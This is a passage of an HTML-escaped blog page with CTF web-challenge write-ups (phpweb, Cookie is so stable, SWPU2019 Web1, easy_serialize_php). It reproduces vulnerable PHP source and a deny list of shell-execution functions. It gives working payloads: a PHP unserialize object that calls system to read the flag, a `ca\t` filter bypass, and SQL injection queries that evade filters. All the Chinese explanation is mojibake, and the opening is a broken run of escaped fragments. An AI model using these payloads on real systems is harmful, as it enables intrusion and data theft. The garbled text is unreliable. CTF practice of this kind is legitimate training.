class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%e3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d4&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%77&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%15&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%87&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%a7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%1&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%dc&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%56&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;a&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%78&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%18&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%af&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%bf&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%02&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%28&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%f3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%8&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%55&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%42&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%75&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%93&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%49&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%67&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%a0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d1&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d5&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%83&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%60&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fb&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%07&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fe&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ¥ç»•è¿‡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;$cmd è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œç›´æ¥ &lt;code&gt;ca\t+/flag&lt;/code&gt;  ç»•è¿‡æ‹¿åˆ° flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ç½‘é¼æ¯-2020-æœ±é›€ç»„phpweb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ç½‘é¼æ¯-2020-æœ±é›€ç»„phpweb&#34;&gt;#&lt;/a&gt; [ç½‘é¼æ¯ 2020 æœ±é›€ç»„] phpweb&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æŸ¥çœ‹æºä»£ç å‘ç°æœ‰éšè—è¡¨å•ï¼Œå‘é€ data å’Œæ—¶é—´ï¼Œå¯èƒ½å­˜åœ¨å‘½ä»¤æ‰§è¡Œ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;evalã€system ç­‰å‡½æ•°ä¼šè¢«æ£€æµ‹ï¼Œäºæ˜¯å…ˆ file_get_contents è¯»ä¸€ä¸‹ index.php:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$disable_fun&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;shell_exec&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;passthru&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;proc_open&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;show_source&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;phpinfo&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;popen&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;dl&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;eval&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;proc_terminate&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;touch&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;escapeshellcmd&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;escapeshellarg&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;assert&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;substr_replace&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;call_user_func_array&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;call_user_func&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_filter&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_walk&amp;quot;&lt;/span&gt;,  &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_map&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;registregister_shutdown_function&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;register_tick_function&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;filter_var&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;filter_var_array&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;uasort&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;uksort&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_reduce&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_walk&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_walk_recursive&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pcntl_exec&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;fopen&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;fwrite&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file_put_contents&amp;quot;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;gettime&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$result&lt;/span&gt; = call_user_func(&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;= gettype(&lt;span class=&#34;hljs-variable&#34;&gt;$result&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt; == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;string&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$result&lt;/span&gt;;&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Test&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Y-m-d h:i:s a&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;date&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;func != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; gettime(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;func, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;p);&lt;br&gt;            &amp;#125;&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;func&amp;quot;&lt;/span&gt;];&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;];&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt; != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt; = strtolower(&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!in_array(&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$disable_fun&lt;/span&gt;)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; gettime(&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hacker...&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°ç¦ç”¨äº†ä¸€äº›å±é™©å‡½æ•°ï¼Œä½†æ˜¯é‡Œé¢æœ‰ä¸€ä¸ª Test ç±»ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸” unserialize æ²¡æœ‰è¢«ç¦ç”¨ï¼Œå°±å¯ä»¥æ„é€ ååºåˆ—åŒ–æ¥å®ç°å‘½ä»¤æ‰§è¡Œã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;payloadï¼š &lt;code&gt;func=unserialize&amp;amp;p=O:4:&amp;quot;Test&amp;quot;:2:&amp;#123;s:1:&amp;quot;p&amp;quot;;s:22:&amp;quot;cat /tmp/flagoefiu4r93&amp;quot;;s:4:&amp;quot;func&amp;quot;;s:6:&amp;quot;system&amp;quot;;&amp;#125;&lt;/code&gt;  æ‹¿åˆ° flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;bjdctf2020cookie-is-so-stable&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bjdctf2020cookie-is-so-stable&#34;&gt;#&lt;/a&gt; [BJDCTF2020]Cookie is so stable&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;æç¤º cookieï¼Œå‘ç°åœ¨ flag è¾“å…¥ id å cookie æœ‰ä¸€ä¸ª user å­—æ®µå­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œæµ‹è¯•4æ˜¾ç¤º Hello 4&lt;/li&gt;
&lt;li&gt;å‘ç°å­˜åœ¨è¿‡æ»¤ï¼Œè¿‡æ»¤äº†: &lt;code&gt;()ã€&#39;&#39;ã€$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ç›´æ¥ç”¨ Twig çš„ payload ç›´æ¥ cat flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;swpu2019web1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#swpu2019web1&#34;&gt;#&lt;/a&gt; [SWPU2019]Web1&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;åœ¨å¹¿å‘Šåå¤„æœ‰è¿‡æ»¤ï¼Œå¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æµ‹è¯• &lt;code&gt;&#39;&lt;/code&gt;  ç„¶åç‚¹å¹¿å‘Šè¯¦æƒ…ä¼šåŒ…é”™ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æµ‹è¯•å­—æ®µæ•°ï¼Œä¸§å¿ƒç—…ç‹‚çš„æœ‰ 22 ä¸ªå­—æ®µæ•°ã€‚ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç©ºæ ¼ç”¨ &lt;code&gt;/**/&lt;/code&gt;  ç»•è¿‡ï¼Œ(select/**/version ()) çœ‹åˆ°æ˜¯ MariaDB&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/&#34;&gt;https://blog.zeddyu.info/2019/03/06/Sqli å¤‡å¿˜å½• /&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;select distinct(table_name) from mysql.innodb_index_stats&lt;/code&gt;  æ‹¿åˆ°è¡¨å&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;è¿‡æ»¤äº† or    æ— åˆ—åæ³¨å…¥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;select group_concat(b) from (select 1,2,3 as b union select * from users)a&lt;/code&gt;  æ‹¿ flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;å®‰æ´µæ¯-2019easy_serialize_php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å®‰æ´µæ¯-2019easy_serialize_php&#34;&gt;#&lt;/a&gt; [å®‰æ´µæ¯ 2019] easy_serialize_php&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ç»™å‡ºæºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; = @&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;f&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$img&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$filter_arr&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;flag&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php5&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;php4&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;fl1g&amp;#x27;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$filter&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.implode(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;|&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$filter_arr&lt;/span&gt;).&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/i&amp;#x27;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; preg_replace(&lt;span class=&#34;hljs-variable&#34;&gt;$filter&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$img&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;)&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;unset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;);&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;user&amp;quot;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;guest&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_SESSION&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;function&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt;;&lt;br&gt;&lt;br&gt;extract(&lt;span 